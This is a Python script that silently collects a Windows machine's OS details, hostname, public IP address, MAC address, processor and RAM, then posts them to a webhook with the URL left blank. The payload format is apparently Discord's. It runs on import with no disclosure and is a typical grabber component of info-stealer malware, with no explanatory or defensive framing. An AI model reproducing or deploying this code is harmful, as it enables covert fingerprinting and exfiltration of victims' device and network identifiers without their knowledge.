import platform
import socket
import json
import re
import uuid
import ctypes
import requests


webhook = ''


def get_system_info():
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ('dwLength', ctypes.c_ulong),
                ('dwMemoryLoad', ctypes.c_ulong),
                ('ullTotalPhys', ctypes.c_ulonglong),
                ('ullAvailPhys', ctypes.c_ulonglong),
                ('ullTotalPageFile', ctypes.c_ulonglong),
                ('ullAvailPageFile', ctypes.c_ulonglong),
                ('ullTotalVirtual', ctypes.c_ulonglong),
                ('ullAvailVirtual', ctypes.c_ulonglong),
                ('ullAvailExtendedVirtual', ctypes.c_ulonglong)
            ]

        memory_status = MEMORYSTATUSEX()
        memory_status.dwLength = ctypes.sizeof(memory_status)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))

        total_ram = memory_status.ullTotalPhys

        info = {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip_address': requests.get('https://ipinfo.io/json').json()['ip'],
            'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
            'ram': f"{str(round(total_ram / (1024**3)))} GB"
        }
        data = json.dumps(info,indent=4)
        requests.post(webhook,json={"content":f"```{data}```"})
    except Exception as e:
        print(e)


system_info = get_system_info()


